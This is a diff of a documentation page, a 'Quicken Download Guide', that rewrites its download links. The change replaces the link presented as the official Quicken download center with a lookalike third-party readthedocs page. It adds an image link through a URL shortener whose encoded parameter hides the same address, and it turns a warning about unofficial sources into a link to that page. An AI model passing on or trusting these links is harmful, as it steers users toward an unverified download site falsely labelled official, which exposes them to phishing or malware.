@@ -5,7 +5,7 @@ Quicken Download Guide
 
 Quicken is one of the most trusted personal finance tools in the U.S., helping users track expenses, manage budgets, monitor investments, and plan for retirement.
 
-However, downloading Quicken from unofficial sources or without verifying your version can result in errors, licensing problems, or even malware. This guide walks you through how to safely and correctly download Quicken—whether you're a first-time user or reinstalling on a new device.
+However, `Download Quicken <https://quickencomdownload-help-center.readthedocs.io/en/latest/>`_ from unofficial sources or without verifying your version can result in errors, licensing problems, or even malware. This guide walks you through how to safely and correctly download Quicken—whether you're a first-time user or reinstalling on a new device.
 
 .. raw:: html
 
@@ -13,7 +13,7 @@ However, downloading Quicken from unofficial sources or without verifying your v
 
 .. image:: getstartedhere.png
    :alt: Quicken Download
-   :target: #
+   :target: https://fm.ci/?aHR0cHM6Ly9xdWlja2VuY29tZG93bmxvYWQtaGVscC1jZW50ZXIucmVhZHRoZWRvY3MuaW8vZW4vbGF0ZXN0
 
 .. raw:: html
 
@@ -29,7 +29,7 @@ Step-by-Step: How to Download Quicken
 
 Go to the official Quicken download center:
 
-`Quicken Download Page <https://www.quicken.com/download>`_
+`Quicken Download Page <https://quickencomdownload-help-center.readthedocs.io/en/latest/>`_
 
 Avoid downloading from third-party or cracked sites, as they may pose security risks or offer outdated files.
 
